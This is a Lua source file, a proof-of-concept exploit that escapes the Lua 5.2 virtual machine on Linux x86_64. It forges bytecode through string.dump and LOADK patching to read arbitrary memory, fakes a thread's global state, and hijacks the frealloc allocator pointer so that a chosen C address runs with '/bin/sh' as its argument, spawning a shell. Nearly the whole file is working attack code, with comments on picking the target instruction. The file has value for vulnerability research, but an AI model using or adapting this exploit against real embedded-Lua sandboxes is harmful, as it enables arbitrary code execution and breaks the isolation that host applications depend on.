--[[
	Escape from lua VM. This PoC is hard coded to run
	 on Lua 5.2, linux x86_64 plaform.
	The variable offset should be set to a proper value (see below).
	The variable argument should be set to a proper value (see below).

	Since this PoC was built for x86_64 the argument will be passed in 
	the $rdi register, following the x86_64 calling convention in linux.
	The $rsi register which represents the second argument in the 
	caliing convention will be set to 0. The value of other parameter 
	registers will be undefined.
	While picking the right instruction to call, it's important to make 
	sure that the value of the other registers is as expected.
	For example, in order to get execve() to be called, which requires 
	three parameters, the registers to $rdi, $rsi and $rdx should be set 
	to something meaningful. Since we can control only $rdi and $rsi, we 
	need to get to an instruction which sets $rdx to a meaningful value 
	before calling execve. Since execve will handle itself with a third 
	argument set to zero (the envp arg), the following sequence will be 
	a good candidate:
		xor %edx, %edx
		call execve@plt
	Other, more simple example, would be calling system(). Since system 
	requiers only one parameter, which we already control ($rdi), we need
	to get the instruction 'call system@plt', there's no need to treat 
	other parameter registers.


	This PoC allows calling c functions. It is done by overriding a 
	pointer to the Lua's frealloc() function (a wrapper to alloc()). 
	
	A simpler PoC will forge a Lua function object, in order to get a lua 
	function to be called. This is not covered in this PoC. 


	Erez Turjeman
	erezto@gmail.com
]]-- 

--[[
	Set the variable offset to point at the desired instruction address.
 	The offset should be calculated as the distance betwin the desired
  	instruction and some anchor. This PoC uses Lua's print function (the 
   	symbol luaB_print in the disassembly) as an anchor.
 ]]--
local offset = 16285

--[[
	Set the variable argument to an argument value to be passed to the 
	desired instruction. The address of the memory location holding the 
	buffer will be passed as argument. 
]]--
local argument = '/bin/sh'

local function _objAddr(o)
	return tonumber(tostring(o):match('^%a+: 0x(%x+)$'),16)
end

local function escapeString(s)
	local i=1
	local len=#s
	while (i<=len) do
		if (s:byte(i) == 0x25) then
			s = s:sub(1, i) .. '%' .. s:sub(i+1)
			len=len+1
			i = i+1
		end
		i = i+1
	end
	return s
end

local function numTo32L(n)
        local a1 = n%256
        local q = (n - a1)/256
        local a2 = q % 256
        q = (q - a2)/256
        local a3 = q % 256
        q = (q - a3)/256
        local a4 = q
        return string.char(a1, a2, a3, a4)
end

local function numTo64L(n)
	local a1 = n%256
	local q = (n - a1)/256
	local a2 = q % 256
	q = (q - a2)/256
	local a3 = q % 256
	q = (q - a3)/256
	local a4 = q % 256
    q = (q - a4)/256
    local a5 = q % 256
    q = (q - a5)/256
    local a6 = q % 256
    q = (q - a6)/256
    local a7 = q % 256
    q = (q - a7)/256
    local a8 = q
	return string.char(a1, a2, a3, a4, a5, a6, a7, a8)
end


local function createLOADK(ra, k, t)
	local Bx = ((t-k)/16)*(2^14)
	local i = 0x01 + (ra*2^6) + Bx
--	print (string.format("%08X, Bx=0x%X", i, Bx/(2^14)))
	i = numTo32L(i)
    return i
end


local function readAddr(addr)
	collectgarbage()
	local function foo()
		local a=0 a=1 a=2 
		return (#a)
	end

	local _k={}
	local _str={}
	if (tostring(_k)>tostring(_str)) then
		local _t = _str
		_str = _k
		_k = _t
	end
	local _intermid={}
--	print ('_str', _str, _objAddr(_str))
	local _str_addr = _objAddr(_str)
--	print ('_intermid', _intermid)
	-- table in 64bit is 56B long
	local _addr = numTo64L(addr - 16)
    local padding_a = string.rep('\65', 8)
    local padding_b = string.rep('\004', 15)
	collectgarbage()
	_str = nil
	_intermid=nil
	collectgarbage()
	_str = padding_a .. _addr .. padding_b;
--	print (#_str, _str);

	foo = string.dump(foo)
	foo = foo:gsub(escapeString(createLOADK(0, 0, 2*16)), 
			escapeString(createLOADK(0, _objAddr(_k), _str_addr+24+8)))
	_intermid = {}
--	print ('_k', _k)
--	print ('_intermid', _intermid)
	collectgarbage()
--	_k = nil
	_intermid = nil
	_k=nil
	collectgarbage()
	foo = load(foo)
	return foo()
end

local function memcpy(src, size)
	local dest = ''
	--pointer size is 8B
	local m = size%8
	for i=0,size-m-8,8 do
		dest = dest .. numTo64L(readAddr(src + i))
	end
	if (m ~= 0) then
		
		local i = (size - m)/8	--Note: size%8 != 0
		dest = dest .. numTo64L(readAddr(src + i)):sub(1,m)
	end
	return dest
end

local function objAddr(o)
	local known_objects = {}
	known_objects['thread'] = 1; known_objects['function']=1; known_objects['userdata']=1; known_objects['table'] = 1;
	local tp = type(o)
	if (known_objects[tp]) then return _objAddr(o) end

	local f = function(a) coroutine.yield(a)  end
	local t = coroutine.create(f)
	local top = readAddr(_objAddr(t) + 16) --The field top is in offset 0x10
	--print (t, string.format("top: 0x%08X", top))
	coroutine.resume(t, o)
	local addr = readAddr(top )
	--print ('addr:', string.format("0x%08X", addr))
	return addr
end


local function bufferAddress(b)
	return (objAddr(b) + 24)
end

--[[
The function will run a new thread (lua_State) with a custome frealloc.
The custom frealloc will be called with the following arguments:
arg a: controlled by the user (i.e. you!)
arg b: NULL
arg c: undefined
arg d: undefined
]]--
local function executeC(addr, arg)
	local f = function() coroutine.yield() local a = string.rep('asda', 20)  end
	local t = coroutine.create(f)
	coroutine.resume(t)
	local t_addr = objAddr(t)
	local l_G_addr = readAddr(readAddr(t_addr) + 24)
	l_G = memcpy(l_G_addr, 496) -- sizeof(global_State)=496
	l_G = numTo64L(addr) .. numTo64L(arg) .. l_G:sub(17)
	l_G_addr = bufferAddress(l_G)
	local t_buffer = memcpy(t_addr, 208) -- sizeof(lua_State)=208
	
	t_buffer = t_buffer:sub(1,14)  .. '\01\01' .. t_buffer:sub(17,24).. numTo64L(l_G_addr) .. t_buffer:sub(33)

	collectgarbage()
	t_addr = bufferAddress(t_buffer)
--	print ('sizeof:', #t_buffer, 'addr:', string.format("%08X", t_addr))
	--create TValue
	local tvl = 'paddingg' .. numTo64L(t_addr) .. '\72\00\00\00\00\00\00\00';
	t_addr = bufferAddress(tvl)+ 8;
	collectgarbage()
	local k = {}
	local k_addr = objAddr(k)
	while ((t_addr - k_addr) > 0x10000 or (k_addr > t_addr)) do
		k={}
		k_addr = objAddr(k)
	end
--	print ('k', k, 't', t, string.format('0x%08X - 0x%08X = 0x%X', t_addr, k_addr, t_addr - k_addr))
--	local g = function() local a=1 os.execute(a) end
	local g = function() local a=1 coroutine.resume(a) end
	g = string.dump(g)
	g = g:gsub('\01%z%z%z(\70\64\64)', escapeString(createLOADK(0, k_addr, t_addr)) .. '%1', 1)
	local intermid = {}
	collectgarbage()
    intermid = nil
    k=nil
    collectgarbage()
    g, err = load(g)
 --   print (string.format('l_G: 0x%08X, #l_G: %d, #t_buffer: %d', l_G_addr, #l_G, #t_buffer))
    g()	
end

local addr = objAddr(print) + offset
executeC(addr, bufferAddress(argument))
